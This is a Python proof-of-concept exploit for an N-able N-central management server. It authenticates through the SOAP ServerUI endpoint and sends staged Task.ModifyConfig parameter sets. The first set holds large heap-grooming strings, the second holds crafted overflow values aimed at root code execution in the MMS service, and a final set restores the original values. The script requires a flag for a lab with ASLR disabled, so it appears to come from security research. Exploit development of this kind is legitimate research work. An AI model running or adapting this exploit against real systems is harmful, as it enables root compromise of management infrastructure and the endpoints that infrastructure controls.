#!/usr/bin/env python3
import argparse
import getpass
import gzip
import html
import os
import re
import sys
import time

import requests
import urllib3


TASK = "1687743279"
NS = "http://www.n-able.com/mickey"
PREFIX = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" '
    'xmlns:xsd="http://www.w3.org/2001/XMLSchema" '
    'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><soapenv:Body>'
)
SUFFIX = "</soapenv:Body></soapenv:Envelope>"


def p_values():
    lengths = {3: 63079, 4: 105232, 5: 105232, 6: 105232,
               7: 105232, 8: 72464, 9: 103600}
    values = {
        "send_cmd_string": "S" * 9240,
        "GenericTCPPrefix": "O" * 504,
        "validating_string": "V" * 16,
        "scan_interval": "5",
        "port": "48119",
        "timeout_value": "2",
    }
    for i in range(31):
        values[f"groom_{i:03d}"] = chr(65 + i % 26) * lengths.get(i, 16)
    for i in range(40):
        values[f"helper_{i:02d}"] = "H" * 67
    return values


def e_values():
    values = {f"helper_{i:02d}": "T" * 63 + "\u1033" + "@"
              for i in range(40)}
    values["send_cmd_string"] = "S" * 9240 + "@s"
    return values


def recovery_values():
    values = p_values()
    for i in range(31):
        values[f"groom_{i:03d}"] = chr(65 + i % 26) * 16
    return values


def post(client, endpoint, body, compressed=False):
    headers = {"Content-Type": "text/xml; charset=utf-8", "SOAPAction": '""'}
    if compressed:
        body = gzip.compress(body, compresslevel=9, mtime=0)
        headers["Content-Encoding"] = "gzip"
    response = client.post(endpoint, data=body, headers=headers, timeout=180)
    response.raise_for_status()
    return response.text


def login(client, endpoint, appliance, customer, username, password):
    hello = (
        PREFIX
        + f'<ns1:Session.Hello xmlns:ns1="{NS}" '
        + 'soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
        + f'<ApplianceID xsi:type="xsd:int">{appliance}</ApplianceID>'
        + "</ns1:Session.Hello>"
        + SUFFIX
    ).encode()
    match = re.search(
        r"<SessionID[^>]*>([1-9][0-9]*)</SessionID>",
        post(client, endpoint, hello),
    )
    if not match:
        raise RuntimeError("Session.Hello did not return a session")
    session_id = int(match.group(1))
    body = (
        PREFIX
        + f'<ns1:User.Login xmlns:ns1="{NS}" '
        + 'soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
        + f'<SessionID xsi:type="xsd:int">{session_id}</SessionID>'
        + f'<CustomerID xsi:type="xsd:int">{customer}</CustomerID>'
        + f'<Email xsi:type="xsd:string">{html.escape(username)}</Email>'
        + f'<Password xsi:type="xsd:string">{html.escape(password)}</Password>'
        + "</ns1:User.Login>"
        + SUFFIX
    ).encode()
    if not re.search(r"<UserID[^>]*>[1-9][0-9]*</UserID>",
                     post(client, endpoint, body)):
        raise RuntimeError("User.Login failed")
    return session_id


def modify_body(session_id, values):
    items = list(values.items())
    refs = "".join(f'<ParameterArray href="#id{i}"/>'
                   for i in range(len(items)))
    objects = []
    for i, (name, value) in enumerate(items):
        objects.append(
            f'<multiRef id="id{i}" xmlns:ns2="{NS}" '
            'xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" '
            'soapenc:root="0" soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" '
            'xsi:type="ns2:T_Parameter">'
            f'<TaskID xsi:type="xsd:int">{TASK}</TaskID>'
            f'<PKey xsi:type="xsd:string">{html.escape(name)}</PKey>'
            f'<PValue xsi:type="xsd:string">{html.escape(value, quote=False)}</PValue>'
            '<ShortName xsi:type="xsd:string" xsi:nil="true"/>'
            '<LongName xsi:type="xsd:string" xsi:nil="true"/>'
            '<HelpText xsi:type="xsd:string" xsi:nil="true"/>'
            '<Min xsi:type="xsd:string" xsi:nil="true"/>'
            '<Max xsi:type="xsd:string" xsi:nil="true"/>'
            '<PType xsi:type="xsd:int" xsi:nil="true"/>'
            '<PreferredIdent xsi:type="xsd:int" xsi:nil="true"/>'
            '<source xsi:type="xsd:string">default</source></multiRef>'
        )
    return (
        PREFIX
        + f'<ns1:Task.ModifyConfig xmlns:ns1="{NS}" '
        + 'soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
        + f'<SessionID xsi:type="xsd:int">{session_id}</SessionID>'
        + '<ParameterArray xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" '
        + f'soapenc:arrayType="ns1:T_Parameter[{len(items)}]" '
        + 'xsi:type="soapenc:Array">'
        + refs
        + "</ParameterArray></ns1:Task.ModifyConfig>"
        + "".join(objects)
        + SUFFIX
    ).encode()


def save(client, endpoint, session_id, values):
    result = post(client, endpoint, modify_body(session_id, values), compressed=True)
    if not re.search(r"<Msg[^>]*>Ok</Msg>", result):
        raise RuntimeError("Task.ModifyConfig failed")


def pause(text, delay):
    if delay:
        time.sleep(delay)
    elif sys.stdin.isatty():
        input(text + ": press Enter to continue: ")
    else:
        raise RuntimeError("use a terminal or supply --delay")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="https://192.168.1.14")
    parser.add_argument("--username", default="productadmin@n-able.com")
    parser.add_argument("--password", default=os.getenv("PRODUCTADMIN_PASSWORD"))
    parser.add_argument("--customer", type=int, default=1)
    parser.add_argument("--appliance", type=int, default=3)
    parser.add_argument("--delay", type=float, default=0)
    parser.add_argument("--insecure", action="store_true")
    parser.add_argument("--run", action="store_true")
    parser.add_argument("--aslr-disabled-lab", action="store_true")
    args = parser.parse_args()

    exploit = e_values()
    print(
        f"task={TASK} E_parameters={len(exploit)} "
        f"E_send_bytes={len(exploit['send_cmd_string'].encode())}"
    )
    if not args.run:
        print("add --run to stage the authenticated P/E sequence")
        return
    if not args.aslr_disabled_lab:
        parser.error("--aslr-disabled-lab is required for the calibrated layout")
    password = args.password or getpass.getpass("ProductAdmin password: ")

    client = requests.Session()
    client.trust_env = True
    client.verify = not args.insecure
    if args.insecure:
        urllib3.disable_warnings()
    endpoint = args.target.rstrip("/") + "/dms/services/ServerUI"
    session_id = login(
        client, endpoint, args.appliance, args.customer, args.username, password
    )

    safe = p_values()
    save(client, endpoint, session_id, safe)
    print(f"P saved parameters={len(safe)}")
    pause("launch fresh one-worker MMS with ASLR disabled and confirm startup P=count1",
          args.delay)
    save(client, endpoint, session_id, exploit)
    print(f"E armed parameters={len(exploit)}")
    pause("confirm cached P=count2 then refreshed E=count3 and capture root ps output",
          args.delay)
    save(client, endpoint, session_id, recovery_values())
    print("P restored parameters=77")


if __name__ == "__main__":
    main()
